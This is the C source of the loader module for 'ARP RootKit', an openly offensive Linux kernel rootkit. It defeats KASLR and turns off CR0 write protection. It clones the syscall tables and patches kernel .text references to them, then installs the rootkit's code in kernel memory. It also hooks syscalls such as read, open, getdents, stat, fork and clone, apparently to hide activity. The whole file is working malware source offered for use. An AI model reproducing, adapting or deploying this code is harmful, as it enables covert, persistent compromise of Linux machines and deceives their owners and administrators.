/***
 *      _  __  __     __                       
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_ 
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_  
 *                                             
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
 * For that, it uses PIC & PIE compilation flags of kernel.c.
 *
 * The code in kernel.c is compiled in the module in the .data section.
 *
 * Arguments are taken by file.
 *
 * Syscall tables references are patched by cloned ones.
 *
 * We return -1 (operation not permitted) because we want the Linux Kernel to unload us fastest possible.
 * On error, -2 is returned.
 * 
 * 13/02/2018 - D1W0U
 */

#include <linux/binfmts.h>
#include <linux/vmalloc.h>
#include <asm/desc.h>
#include <linux/net.h>
#include <linux/file.h>
#include <asm/msr.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

//#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
//#define sleep(var)
#define sleep(var) pinfo("Press ENTER to continue..."); KSYSCALL(__NR_read, 0, &var, 1, 0, 0, 0)

#include "loader.h"
#include "kernel.h"
#include "hooks.h"
#include "queue.h"

/*
 * Global variables.
 */
long vmalloc_start = 0;
long kernel_base = 0, kaslr_offset = 0;

// Function variables.
void (*f_kernel_test)(void) = NULL;
int (*f_kernel_init)(void) = NULL;

// Module params.
long image_sct = 0, image_ia32sct = 0, image_text = 0, text_size = 0, image_sct_len = 0, image_ia32sct_len = 0;

/*
 * Function declarations.
 */
int disassemble(void *code, size_t code_len);
int safe_zero(void *dst, size_t len);
int clone_sct(void *dst, void *src, size_t len);
inline void install_hooks(void);
inline int calc_addr_offset(void);
long rand64(void);
int rand32(void);
inline mm_segment_t *search_addr_limit(void);
inline long find_kernel_base(long start);
inline int load_params(void);
inline long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen);
void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgprot_t prot, ulong vm_flags);
inline int clone_syscall_tables(void);
inline int patch_syscall_tables_refs(void);
inline int install_rkkernel(void);
inline int unpatch_syscall_tables_refs(void);
inline void release_cloned_syscall_tables(void);
inline void release_rkkernel(void);
inline int unload(void);

// those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
inline void disable_wp(void);
inline void enable_wp(void);

/*
 * Function definitions.
 */
inline int load(void) {
	int ret = 0;

	addr_limit = search_addr_limit();
	if (addr_limit == NULL) {
		return -2;
	}

	kernel_len = &kernel_end - &kernel_start;
	kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
	kernel_pages = kernel_paglen >> PAGE_SHIFT;

	/*
	 * Make our kernel executable, to can use pinfo(), perr().
	 */
	set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);

	/*
	 * Load Linux Kernel exported symbols for our rootkit.
	 */
	f_kmalloc = kmalloc;
	f_kfree = kfree;
	f_find_vpid = find_vpid;
	f_vscnprintf = vscnprintf;
	f_printk = printk;
	f_strncmp = strncmp;
	f_probe_kernel_write = probe_kernel_write;
	f_strlen = strlen;
	f_kstrtoull = kstrtoull;
	f_memcpy = memcpy;
	f_memcmp = memcmp;
	f_call_usermodehelper = call_usermodehelper;
	f_strreplace = strreplace;

	kernel_tree = get_kernel_tree();

	if (my_get_fs().seg != 0x7ffffffff000) {
		// TODO: maybe to bruteforce the addr_limit address.
		return -2;
	}

	pinfo("kernel_tree = %d\n", kernel_tree);
	pinfo("fs          = %lx\n", my_get_fs().seg);
	//return -1;

	/*
	 * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
	 * the rootkit shouldn't use kallsyms_lookup_name in "production" kernels, I mean, it doesn't have to depend from finding symbols with this API because it's not always present.
	 * Symbols from kallsyms not are always available. It's a configuration flag in kernel.
	 */
	f_sys_write = kallsyms_lookup_name("sys_write");

	/*
	 * Load parameters, from "arprk.params".
	 */
	if (load_params()) {
		return -2;
	}

	/*
	 * Find kernel base.
	 * Calculate KASLR offset.
	 * Take offset to sys_call_table, and ia32_sys_call_table (from vmlinuz image offset in param).
	 * Search all references in .text section. (size in param from vmlinuz image).
	 */
	kernel_base = find_kernel_base(image_text); 
	kaslr_offset = kernel_base - image_text;
	sys_call_table = (void *)(kernel_base - image_text + image_sct);
	ia32_sys_call_table = (void *)(kernel_base - image_text + image_ia32sct);

	pinfo("Parameters:\n");
	pinfo("kernel_base         = %lx\n", kernel_base);
	pinfo("image .text         = %lx\n", image_text);
	pinfo("image sct           = %lx\n", image_sct);
	pinfo("image sct len       = %ld\n", image_sct_len);
	pinfo("image ia32sct       = %lx\n", image_ia32sct);
	pinfo("image ia32sct len   = %ld\n", image_ia32sct_len);
	pinfo(".text size          = %ld\n", text_size);
	pinfo("sys_call_table      = %lx\n", sys_call_table);
	pinfo("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
	
	sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)sys_call_table, &nsct_refs);
	pinfo("Found %d refs to sys_call_table in kernel's .text\n", nsct_refs);
	ia32sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)ia32_sys_call_table, &nia32sct_refs);
	pinfo("Found %d refs to ia32_sys_call_table in kernel's .text\n", nia32sct_refs);

	/*
	 * Search not exported symbols.
	 */

	/*
	 * Clone the syscall tables.
	 */
	if (clone_syscall_tables()) {
		perr("Sorry, can't clone_syscall_tables().\n");
		return -2;
	}
	
	/*
	 * Patch references to syscall tables, on the .text section.
	 */
	if (patch_syscall_tables_refs()) {
		perr("Sorry, can't patch_syscall_tables_refs().\n");
		return -2;
	}

	/*
	 * Insert out rootkit into memory.
	 */
	if (install_rkkernel()) {
		perr("Sorry, can't install_rkkernel().\n");
		return -2;
	}

	f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
	pinfo("Calling RK's Kernel test function ...\n");
	f_kernel_test();

	f_kernel_init = kernel_addr + ((unsigned long)&kernel_init - (unsigned long)&kernel_start);
	pinfo("Initializing kernel ...\n");
	f_kernel_init();

	/*
	 * Setup hooks, and we're done.
	 */
	install_hooks();
	sleep(ret);
	if (unload() == -2) {
		perr("Sorry, error when unload().\n");
		return -2;
	}

	/* Success! */
	return -1;
}

inline int unload(void) {
	/* This only for devel, we must uninstall loader and reboot to successfully unload the rootkit */
	// May crash some process due to the unhide protection
	pinfo("Unpatching syscall tables refs ...\n");
	if (unpatch_syscall_tables_refs() == -2) {
		perr("Sorry, error while unpatching syscall tables refs. Aborting ...\n");
		return -2;
	}

	return -1;
}

inline void release_cloned_syscall_tables(void) {
	vfree(my_sct);
	vfree(my_ia32sct);
}

inline void release_rkkernel(void) {
	vfree(kernel_addr);
}

inline int unpatch_syscall_tables_refs(void) {
	int n = 0, addr = 0, ret = 0, *p = NULL;

	// first patch refs to sys_call_table, and later to ia32_sys_call_table
	for (; n < nsct_refs; n++) {
		p = (int *) sct_refs[n];
		pinfo("unpatching ref %d of sys_call_table %lx ...\n", n, p);
	    pinfo("value before patch = %x\n", *p);
		disable_wp();
		addr = (int) sys_call_table;
	    ret = probe_kernel_write(p, &addr, sizeof(int));
		enable_wp();
		pinfo("value after patch = %lx\n", *p);
		if (ret != 0) {
			return -2;
		}
	}

    for (n = 0; n < nia32sct_refs; n++) {
        p = (int *) ia32sct_refs[n];
        pinfo("unpatching ref %d of ia32_sys_call_table %lx ...\n", n, p);
        pinfo("value before patch = %x\n", *p);
        disable_wp();
        addr = (int) ia32_sys_call_table;
        ret = probe_kernel_write(p, &addr, sizeof(int));
        enable_wp();
        pinfo("value after patch = %lx\n", *p);
        if (ret != 0) {
            return -2;
        }
    }

	return 0;
}

inline void install_hooks(void) {
	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));

	/* Networking */
	HOOK64(__NR_read, KADDR(my_read64));
	HOOK64(__NR_reboot, KADDR(my_reboot64));
	HOOK64(__NR_open, KADDR(my_open64));
	HOOK64(__NR_openat, KADDR(my_openat64));
	HOOK64(__NR_getdents, KADDR(my_getdents64));
	HOOK64(__NR_getdents64, KADDR(my_getdents6464));
	HOOK64(__NR_stat, KADDR(my_stat64));
	HOOK64(__NR_lstat, KADDR(my_lstat64));
	HOOK64(__NR_newfstatat, KADDR(my_newfstatat64));

	/* Process management */
	HOOK64(__NR_fork, KADDR(my_fork64));
	HOOK64(__NR_vfork, KADDR(my_vfork64));
	HOOK64(__NR_clone, KADDR(my_clone64));
	/*
	HOOK64(__NR_wait4, KADDR(my_wait464));
	HOOK64(__NR_kill, KADDR(my_kill64));
        HOOK64(__NR_waitid, KADDR(my_waitid64));
        HOOK64(__NR_getpid, KADDR(my_getpid64));
        HOOK64(__NR_gettid, KADDR(my_gettid64));
        HOOK64(__NR_getppid, KADDR(my_getppid64));
        HOOK64(__NR_getpgid, KADDR(my_getpgid64));
        HOOK64(__NR_getpgrp, KADDR(my_getpgrp64));
        HOOK64(__NR_getsid, KADDR(my_getsid64));
        HOOK64(__NR_setsid, KADDR(my_setsid64));
        HOOK64(__NR_tkill, KADDR(my_tkill64));
        HOOK64(__NR_tgkill, KADDR(my_tgkill64));
        HOOK64(__NR_ptrace, KADDR(my_ptrace64));
        HOOK64(__NR_rt_sigqueueinfo, KADDR(my_rt_sigqueueinfo64));
        HOOK64(__NR_rt_tgsigqueueinfo, KADDR(my_rt_tgsigqueueinfo64));
        HOOK64(__NR_sched_setparam, KADDR(my_sched_setparam64));
        HOOK64(__NR_sched_getparam, KADDR(my_sched_getparam64));
        HOOK64(__NR_sched_setscheduler, KADDR(my_sched_setscheduler64));
        HOOK64(__NR_sched_getscheduler, KADDR(my_sched_getscheduler64));
        HOOK64(__NR_sched_rr_get_interval, KADDR(my_sched_rr_get_interval64));
        HOOK64(__NR_sched_setaffinity, KADDR(my_sched_setaffinity64));
        HOOK64(__NR_sched_getaffinity, KADDR(my_sched_getaffinity64));
        HOOK64(__NR_migrate_pages, KADDR(my_migrate_pages64));
        HOOK64(__NR_move_pages, KADDR(my_move_pages64));
        HOOK64(__NR_perf_event_open, KADDR(my_perf_event_open64));
        HOOK64(__NR_prlimit64, KADDR(my_prlimit6464));
        HOOK64(__NR_process_vm_readv, KADDR(my_process_vm_readv64));
        HOOK64(__NR_process_vm_writev, KADDR(my_process_vm_writev64));
        HOOK64(__NR_kcmp, KADDR(my_kcmp64));
        HOOK64(__NR_sched_setattr, KADDR(my_sched_setattr64));
        HOOK64(__NR_sched_getattr, KADDR(my_sched_getattr64));
        HOOK64(__NR_get_robust_list, KADDR(my_get_robust_list64));
        HOOK64(__NR_getpriority, KADDR(my_getpriority64));
        HOOK64(__NR_setpriority, KADDR(my_setpriority64));
        HOOK64(__NR_ioprio_get, KADDR(my_ioprio_get64));
        HOOK64(__NR_ioprio_set, KADDR(my_ioprio_set64));
        HOOK64(__NR_capget, KADDR(my_capget64));
        HOOK64(__NR_capset, KADDR(my_capset64));
        HOOK64(__NR_set_tid_address, KADDR(my_set_tid_address64));
        HOOK64(__NR_seccomp, KADDR(my_seccomp64));
        HOOK64(__NR_prctl, KADDR(my_prctl64));
	*/
	pinfo("Hooks installed!\n");
}

int safe_zero(void *dst, size_t len) {
	char zero = 0;
	size_t i = 0;
	int ret = 0;
	char *cdst = dst;

	for(; i < len; i++) {
		ret = probe_kernel_write(&cdst[i], &zero, sizeof(zero));
		if (ret != 0) {
			return ret;
		}
	}

	return 0;
}

int clone_sct(void *dst, void *src, size_t len) {
	size_t i = 0;
	int ret = 0;
	long *ldst = dst, *lsrc = src, addr;

	for (; i < len; i++) {
		ret = probe_kernel_read(&addr, &lsrc[i], sizeof(addr));
		if (ret != 0) {
			perr("Sorry, probe_kernel_reat() ret = %d, on %s().", ret, __func__);
			return ret;
		}

		ret = probe_kernel_write(&ldst[i], &addr, sizeof(addr));
		if (ret != 0) {
			perr("Sorry, probe_kernel_write() ret = %d on %s().", ret, __func__);
			return ret;
		}
	}

	return 0;
}

// from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
inline void disable_wp(void) {
	asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

inline void enable_wp(void) {
	asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

int disassemble(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	size_t j, i;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		perr("cs_open() error\n");
		return -1;
	}

	cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	count = cs_disasm(handle, code, code_len, (unsigned long)code, 0, &insn);
	pinfo("%d instructions disassembled.\n", count);
	if (count > 0) {
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x ", insn[j].bytes[i]);
			}
			pinfo("\n");
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

long rand64(void) {
    long r = get_seconds() << 64;
    return r;
}

int rand32(void) {
    return (int)rand64();
}

inline int calc_addr_offset(void) {
    return (rand32() % 1024 + 1) * PAGE_SIZE;;
}

/*
 * I found a way of getting addr_limit between kernel versions.
 * If the version is < 4.8, the addr_limit is in current_thread_info->addr_limit.
 * But if the version is >= 4.8, the addr_limit is in current->thread.addr_limit.
 *
 * So, we look for the default Kernel addr_limit which is quite unique.
 * This way is generic as the "current_task" symbol is exported in every kernel.
 * And won't give us a problem when using patch-lkm.py.
 *
 * Finally this way is generic between versions.
 */
inline mm_segment_t *search_addr_limit(void) {
	char *cts = NULL;
	char *cti = NULL;
	off_t i = 0;

	asm("andq\t%%rsp, %0": "=r" (cti) : "0" (~0x3FFFUL)); // Adapted get current thread info form SucKIT. (Thanks)
	asm("movq\t%%gs:current_task, %0" : "=r" (cts));      // Get current task_struct.
	for (; i < 0x4000; i++) {
		if (*(long *)&cti[i] == 0x7ffffffff000) {
			// We are in kernel < 4.8.x
			printk("addr_limit offset %ld\n", i);
			printk("cti               %lx\n", cti);
			return (mm_segment_t *)(cti + i);
		} else if (*(long *)&cts[i] == 0x7ffffffff000) {
			// We are in kernel >= 4.8.x
			printk("addr_limit offset %ld\n", i);
			printk("cts               %lx\n", cts);
			return (mm_segment_t *)(cts + i);
		}
	}
	return NULL;
}

/*
 * This functions locates the _text address (kernel base), with(out) KASLR.
 */
inline long find_kernel_base(long start) {
	off_t off = 0, inc = 0x100000;
	char opcode = 0;

	for (; !opcode; off += inc) {
		probe_kernel_read(&opcode, (void *)start + off, 1);
	}

	return start + off - inc;
}

/*
 * Load parameters from user-land's loader, into this kernel-space.
 * For that, we use an intermediate file, because passing args here is not generic.
 */
inline int load_params(void) {
	void *tmp = NULL;
	int ret = 0;
	mm_segment_t old_fs;
	loff_t pos = 0;

	tmp = filp_open("arprk.params", O_RDONLY, 0);
	if (IS_ERR(tmp)) {
		perr("Sorry, can't open params file.\n");
		return -2;
	}

	// We can't use vfs_read because is not exported since v4.14.
	// kernel_read maybe is possible, but depending on the tree the args are order changed.
	// So, the best option I found is read_code(). That is not the best option because it flushes icache,
	// but theorically won't hurt...

	old_fs = my_get_fs();
	my_set_fs(KERNEL_DS);
	ret = read_code(tmp, (ulong)&image_text, pos, sizeof(image_text));
	if (ret != sizeof(long)) {
		perr("Sorry, can't read from params' file.\n");
		return -2;
	}
	pos += ret;
	ret = read_code(tmp, (ulong)&image_sct, pos, sizeof(image_sct));
	if (ret != sizeof(long)) {
		perr("Sorry, can't read from params' file.\n");
		return -2;
	}
	pos += ret;
	ret = read_code(tmp, (ulong)&image_ia32sct, pos, sizeof(image_ia32sct));
	if (ret != sizeof(long)) {
		perr("Sorry, can't read from params' file.\n");
		return -2;
	}
	pos += ret;
	ret = read_code(tmp, (ulong)&text_size, pos, sizeof(text_size));
	if (ret != sizeof(long)) {
		perr("Sorry, can't read from params' file.\n");
		return -2;
	}
    pos += ret;
    ret = read_code(tmp, (ulong)&image_sct_len, pos, sizeof(image_sct_len));
    if (ret != sizeof(long)) {
        perr("Sorry, can't read from params' file.\n");
        return -2;
	}
    pos += ret;
    ret = read_code(tmp, (ulong)&image_ia32sct_len, pos, sizeof(image_ia32sct_len));
    if (ret != sizeof(long)) {
        perr("Sorry, can't read from params' file.\n");
        return -2;
    }
	my_set_fs(old_fs);
	filp_close(tmp, NULL);

	if (image_text == 0 || image_sct == 0 || image_ia32sct == 0 || text_size == 0) {
		perr("Sorry, some of the parameters are 0.\n");
		return -2;
	}

	return 0;
}

inline long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen) {
    off_t off = 0;
    int *p = NULL;
    long *refs = NULL;
	size_t refs_size = 2;

	refs = kmalloc(sizeof(long) * refs_size, GFP_KERNEL);
	if (IS_ERR(refs)) {
		return NULL;
	}

	for (*olen = 0; off < text_size; off++) {
        p = (int *) (addr + off);
        if (*p == bytecode) {
			refs[*olen] = (long) p;
			refs_size += 1;
			*olen += 1;
			refs = krealloc(refs, sizeof(long) * refs_size, GFP_KERNEL);
			if (IS_ERR(refs)) {
				return NULL;
			}
        }
    }

	return refs;
}

void *my_vmalloc_area(struct vm_struct *area, gfp_t gfp_mask, pgprot_t prot) {
	struct page **pages;
	unsigned int nr_pages, array_size, i;
	const gfp_t nested_gfp = __GFP_ZERO;
	const gfp_t alloc_mask = gfp_mask | __GFP_NOWARN;

	nr_pages = get_vm_area_size(area) >> PAGE_SHIFT;
	array_size = (nr_pages * sizeof(struct page *));

	area->nr_pages = nr_pages;
	/* Please note that the recursion is strictly bounded. */
	if (array_size > PAGE_SIZE) {
		pages = __vmalloc(array_size, nested_gfp | __GFP_HIGHMEM, MY_PAGE_KERNEL_NOENC);
		area->flags |= 0x10; // VM_VPAGES
	} else {
		pages = kmalloc(array_size, nested_gfp);
	}
	area->pages = pages;
	if (!area->pages) {
		free_vm_area(area);
		return NULL;
	}

	for (i = 0; i < area->nr_pages; i++) {
		struct page *page;

		page = alloc_page(alloc_mask);

		if (unlikely(!page)) {
			/* Successfully allocated i pages, free them in __vunmap() */
			area->nr_pages = i;
			goto fail;
		}
		area->pages[i] = page;
		if (gfp_mask & 0x10u) // __GFP_WAIT or __GFP_RECLAIMABLE
			cond_resched();
	}

	if (map_vm_area(area, prot, pages))
		goto fail;
	return area->addr;

fail:
	vfree(area->addr);
	return NULL;
}

inline void clear_vm_uninitialized_flag(struct vm_struct *vm) {
	/*
	 * Before removing VM_UNINITIALIZED,
	 * we should make sure that vm has proper values.
	 * Pair with smp_rmb() in show_numa_info().
	 */
	smp_wmb();
	vm->flags &= ~VM_UNINITIALIZED;
}

void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgprot_t prot, ulong vm_flags) {
	struct vm_struct *area;
	void *addr;
	unsigned long real_size = size;

	area = __get_vm_area(size, vm_flags, start, end);
	if (!area)
		goto fail;

	addr = my_vmalloc_area(area, gfp_mask, prot);
	if (!addr)
		return NULL;

	/*
	 * In this function, newly allocated vm_struct has VM_UNINITIALIZED
	 * flag. It means that vm_struct is not fully initialized.
	 * Now, it is fully initialized, so remove this flag here.
	 */
	clear_vm_uninitialized_flag(area);

	/*
	 * A ref_count = 2 is needed because vm_struct allocated in
	 * __get_vm_area_node() contains a reference to the virtual address of
	 * the vmalloc'ed block.
	 */
	kmemleak_alloc(addr, real_size, 2, gfp_mask);

	return addr;

fail:
	return NULL;
}

inline int clone_syscall_tables(void) {
	size_t my_sct_pagelen = 0;
	int ret = 0;

    //ret = sct_len(sys_call_table, &my_sct_len);
    //if (ret != 0) {
    //  perr("Sorry, sct_len(sys_call_table) ret = %d.\n", ret);
    //  return -2;
    //}
    //pinfo("sys_call_table len = %d\n", my_sct_len);

	my_sct_pagelen = PAGE_ROUND_UP(image_sct_len * sizeof(void *));
	vmalloc_start = MODULES_VADDR + calc_addr_offset();
	pinfo("vmalloc_start = %lx\n", vmalloc_start);
	//my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
	my_sct = my_vmalloc_range(my_sct_pagelen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0);
	//my_sct = vmalloc(my_sct_pagelen);
	if (my_sct == NULL) {
		perr("Sorry, can't reserve memory with my_vmalloc_range() for my_sct.\n");
		return -2;
	}
	pinfo("reserved %d bytes at %lx\n", my_sct_pagelen, my_sct);

	// zero memory
	ret = safe_zero(my_sct, my_sct_pagelen);
	if (ret != 0) {
		perr("Sorry, can't zero memory of my_sct.\n");
		return -2;
	}
	pinfo("my_sct zeroed!\n");

	//sleep(ret);

	ret = clone_sct(my_sct, sys_call_table, image_sct_len);
	if (ret != 0) {
		perr("Sorry, can't clone sys_call_table.\n");
		return -2;
	}
	pinfo("my_sct = %lx, len = %d\n", my_sct, image_sct_len);

	//sleep(ret);

	//ret = sct_len(ia32_sys_call_table, &my_sct_len);
	//if (ret != 0) {
	//	perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
		// TODO: free memory.
	//	return -2;
	//}
	//pinfo("ia32_sct len = %d\n", my_sct_len);

	//sleep(ret);

	my_sct_pagelen = PAGE_ROUND_UP(image_ia32sct_len * sizeof(void *));
	// TODO: add KASLR offset in start address.
	//my_ia32sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
	my_ia32sct = my_vmalloc_range(my_sct_pagelen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0);
	if (my_ia32sct == NULL) {
		perr("Sorry, can't reserve memory for my_ia32sct.\n");
		return -2;
	}
	pinfo("reserved %d bytes at %lx.\n", my_sct_pagelen, my_ia32sct);

	//sleep(ret);

	// zero memory
	ret = safe_zero(my_ia32sct, my_sct_pagelen);
	if (ret != 0) {
		perr("Sorry, can't zero memory for our sct.\n");
		return -2;
	}
	pinfo("my_ia32sct zeroed!\n");	

	//sleep(ret);

	ret = clone_sct(my_ia32sct, ia32_sys_call_table, image_ia32sct_len);
	if (ret != 0) {
		perr("Sorry, clone_sct(my_ia32sct) ret = %d.\n", ret);
		// TODO: free memory
		return -2;
	}
	pinfo("ia32_sct cloned at = %lx\n", my_ia32sct);

	return 0;
}

inline int patch_syscall_tables_refs(void) {
	int n = 0, addr = 0, ret = 0, *p = NULL;

	// first patch refs to sys_call_table, and later to ia32_sys_call_table
	for (; n < nsct_refs; n++) {
		p = (int *) sct_refs[n];
		pinfo("patching ref %d of sys_call_table %lx ...\n", n, p);
	    pinfo("value before patch = %x\n", *p);
		disable_wp();
		addr = (int) my_sct;
	    ret = probe_kernel_write(p, &addr, sizeof(int));
		enable_wp();
		pinfo("value after patch = %lx\n", *p);
		if (ret != 0) {
			return -2;
		}
	}

    for (n = 0; n < nia32sct_refs; n++) {
        p = (int *) ia32sct_refs[n];
        pinfo("patching ref %d of ia32_sys_call_table %lx ...\n", n, p);
        pinfo("value before patch = %x\n", *p);
        disable_wp();
        addr = (int) my_ia32sct;
        ret = probe_kernel_write(p, &addr, sizeof(int));
        enable_wp();
        pinfo("value after patch = %lx\n", *p);
        if (ret != 0) {
            return -2;
        }
    }

	return 0;
}

inline int install_rkkernel(void) {
	int ret = 0;

	pinfo("Installing the rootkit's kernel ...\n");

	pinfo("RK's Kernel info:\n");
    pinfo("kernel_len           = %d\n", kernel_len);
	pinfo("kernel_paglen        = %d\n", kernel_paglen);
	pinfo("kernel_pages         = %d\n", kernel_pages);
	pinfo("kernel_start         = %lx\n", &kernel_start);
	pinfo("kernel_start_pagdown = %lx\n", PAGE_ROUND_DOWN(&kernel_start));
    
	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
    //kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
    kernel_addr = my_vmalloc_range(kernel_paglen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0);
    if (kernel_addr == NULL) {
        perr("Sorry, can't allocate memory.\n");
        return -2;
    }
    
	pinfo("kernel_addr          = %lx\n", kernel_addr);
	pinfo("kernel_addr_pagdown  = %lx\n", PAGE_ROUND_DOWN(kernel_addr));

    /*
     * Make our rootkit code executable.
     */
    //ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
    //pinfo("ret = %d\n", ret);
    //pinfo("kernel_addr's pages are now executable.\n");

    ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
    if (ret != 0) {
        perr("Sorry, can't copy kernel to its place.\n");
        return -2;
    }

	pinfo("RK's Kernel is now installed.\n");

    //disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));

	return 0;
}
